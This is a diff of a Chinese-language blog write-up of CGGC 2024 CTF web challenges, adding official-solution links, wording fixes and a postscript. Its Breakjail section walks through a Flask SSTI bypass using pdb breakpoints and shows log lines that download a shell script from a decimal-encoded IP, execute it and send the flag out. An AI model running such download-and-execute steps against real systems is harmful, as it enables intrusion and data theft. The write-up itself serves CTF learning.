@@ -15,7 +15,7 @@ menu = "main"
 ## Preview Site 🔍
 
 題目作者：[Vincent55](https://vincent55.tw/)\
-解題組數：
+[官方解](https://github.com/Vincent550102/My-CTF-Challenge/tree/main/cggc_2024_qual#preview-site-)
 
 {{<details "Source code">}}
 
@@ -108,7 +108,7 @@ curl 'http://10.99.66.5:10002/fetch' \
 ## proxy
 
 題目作者：[Chumy](https://blog.chummydns.com/)\
-解題組數：
+[原始碼](https://github.com/Jimmy01240397/My-CTF-Challenges/tree/master/cggc-2024/proxy)
 
 > Access <http://secretweb/flag> to get flag.
 
@@ -156,7 +156,7 @@ if (!isset($_GET['service']) && !isset($_COOKIE["service"])) {
 
 {{</details>}}
 
-這題是利用 PHP cURL Module 實作的 Proxy Server，我們要利用這個 Proxy Server 來存取 `http://secretweb/flag`，但輸入的 URI 會被過濾後串上 `".cggc.chummy.tw:".$port`。這裡最可疑的 Function 是 `idn_to_ascii()`，看起來是為了那個越獄的 IDN~~，PHP 這種老東西碰這種新穎的玩具九成會出問題~~。
+這題是利用 PHP cURL Module 實作的 Proxy Server，我們要利用這個 Proxy Server 來存取 `http://secretweb/flag`，但輸入的 URI 會被過濾後串上 `".cggc.chummy.tw:".$port`。這裡最可疑的 Function 是 `idn_to_ascii()`，看起來是為了那個越獄的 IDN，~~PHP 這種老東西碰這種新穎的玩具九成會出問題~~。
 
 Fuzzing 一陣子之後想起來上一題的 `/logout` 會吃 Query 然後 Redirect，這題剛好會傳 Query 加上設定上有開 cURL Redirect 就拿來用了。
 
@@ -170,7 +170,7 @@ CGGC{1Dn_7O_45c11_5o_57R4n9E_11fc26f06c33e83f65ade64679dc0e58}
 ## Breakjail Online 🛜
 
 題目作者：[好駭客 Vincent55](https://vincent55.tw/)\
-解題組數：
+[官方解](https://github.com/Vincent550102/My-CTF-Challenge/tree/main/cggc_2024_qual#breakjail-online-)
 
 {{<details "Source code">}}
 
@@ -210,9 +210,11 @@ def showip():
 
 {{</details>}}
 
+⚠️ Unintended Solution
+
 Flask SSTI 但用於取得 Global Object 的 `.` 和 `_` 都被 Filter 掉了，且 Payload 不可以超過 88 個字元。把題目在電腦上架起來和修好 `return` 後發現（\_Viεcon\_　剛好在解 Breakjail ⛓️ ~~不然我根本不知道這個 Function~~） `breakpoint()` 是與 Python Debugger 互動，並且有個 [Debugger Command](https://docs.python.org/3/library/pdb.html#debugger-commands) `commands \[bpnumber\]` 可以執行 Python Code，並且檢查 Log 會發現在 pdb 崩潰（沒有空間加上離開 pdb 的指令）之前確實有成功執行 Python Code。
 
-Flag 的檔名後面有接上亂數，我們必須取得 Shell 才能順利取得 Flag。為了繞過取得 `os.system()` 的 `.`，我們需要執行兩串 Python Code，第一串先 `form os import *`，第二串就能直接用 `system()`。由於 `return` 被寫死成一個字串~~我又懶的研究 Python Bytecode 怎麼 return 東西~~，我選擇在目標主機上直接寫個 Shell Script 然後開個 Web Server 來收 Flag。最後一個問題是 IP 和 Domain 都會用到 `.` 字元，把 IP 轉成 10 進位數字就可以繞過。
+Flag 的檔名後面有接上亂數，我們必須取得 Shell 才能順利取得 Flag。為了繞過取得 `os.system()` 的 `.`，我們需要執行兩串 Python Code，第一串先 `form os import *`，第二串就能直接用 `system()`。由於 `return` 被寫死成一個字串~~我又懶得研究這東西能不能 return 東西~~，我選擇在目標主機上直接寫個 Shell Script 然後開個 Web Server 來收 Flag。最後一個問題是 IP 和 Domain 都會用到 `.` 字元，把 IP 轉成 10 進位數字就可以繞過。
 
 ```typescript
 import { sleep } from 'bun'
@@ -258,14 +260,13 @@ sudo bun index.ts
 Got message: /
 # 目標跟收 Flag 的機器要攻擊腳本
 Executed shell command: wget -O /z 2130706433. Response: 500
-# ~~My IP is 127.0.0.1~~
 Executed shell command: chmod +x /z. Response: 500
 Got message: /CGGC{breakpoint_is_a_biiiig_gadget_oj237rpwd3i2}
 # 出了點問題，收 Flag 機器沒辦法連上 VPN，這是用 VPN 內的機器打，VPN 外的機器收 Flag
 Executed shell command: /z. Response: 500
 ```
 
-由於我們沒有指定要離開 pdb，pdb 發現沒指令了會崩潰，回傳 500 正常。
+由於我們沒有下指令離開 pdb，pdb 發現沒指令了會崩潰，HTTP Reponse 500 正常。
 
 這組 Payload 的 Prefix 50 字元，Suffix 6 字元，理論上能縮短成：
 
@@ -277,6 +278,14 @@ chmod +x z
 ./z
 ```
 
-理論上可以達到 67 個字元，~~晚點測試完回來更新~~
+用這個方法可以達到 67 個字元。
 
 First Blood 🩸
+
+預期解是用 `request.query_string` 放 Payload 來繞過 Filter，並且與傳統 SSIT 一樣用 `''.__class__`　方式取得 Global Object 並 RCE。
+
+## 後記
+
+![scoreborad](scoreboard.webp)
+
+我們（又）在比賽前期衝到第一名，後面大神們開打排名慢慢掉下來，一題都解不開了。
